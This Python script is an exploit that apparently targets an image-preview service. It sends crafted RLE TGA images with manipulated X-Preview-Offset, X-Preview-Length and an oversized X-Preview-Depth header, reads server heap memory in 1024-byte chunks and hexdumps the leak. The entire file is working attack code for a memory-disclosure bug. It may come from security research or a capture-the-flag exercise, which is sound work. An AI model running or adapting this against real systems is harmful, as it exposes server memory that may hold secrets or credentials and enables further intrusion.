#!/usr/bin/env python3
"""Walk heap chunks via a real leak window whose chunk header sits right below 0."""
import struct, sys, re
from raw import send_raw, parse, tga, tga_rle_raw

W = 32
H = 32
G = 1024

def img64():
    # 64x64x24 grayscale-ish RLE so decoded buffer is 12288 wide
    return tga(64, 64, imgtype=10, payload=tga_rle_raw(64 * 64))

def img_small():
    return tga(4, 4, imgtype=10, payload=tga_rle_raw(16))

def leak(headers, body, window, chunk=1024, n=8):
    out = b""
    for k in range(n):
        off = window + k * chunk
        h = list(headers) + [("X-Preview-Offset", str(off)),
                             ("X-Preview-Length", str(chunk)),
                             ("X-Preview-Depth", "2000000000")]
        head, b = parse(send_raw(h, body))
        if len(b) != chunk:
            print("  short at", hex(off), len(b))
            break
        out += b
    return out

def hexdump(d, base=0, lim=None):
    n = len(d) if lim is None else min(lim, len(d))
    for i in range(0, n, 16):
        hx = d[i:i+16]
        asc = "".join(chr(c) if 32 <= c < 127 else "." for c in hx)
        print(f"  {base+i:#07x} {hx.hex():<32} {asc}")

if __name__ == "__main__":
    for label, img, short in (("64x64", img64(), False), ("4x4", img_small(), True)):
        hdr = [("Content-Length", str(len(img)))]
        data = leak(hdr, img, 0, 1024, 2)
        print(label, "size", len(img), "first 64 bytes of heap:")
        hexdump(data[:64])
        print("  ...last 96 of window:")
        hexdump(data[-96:], base=len(data)-96)
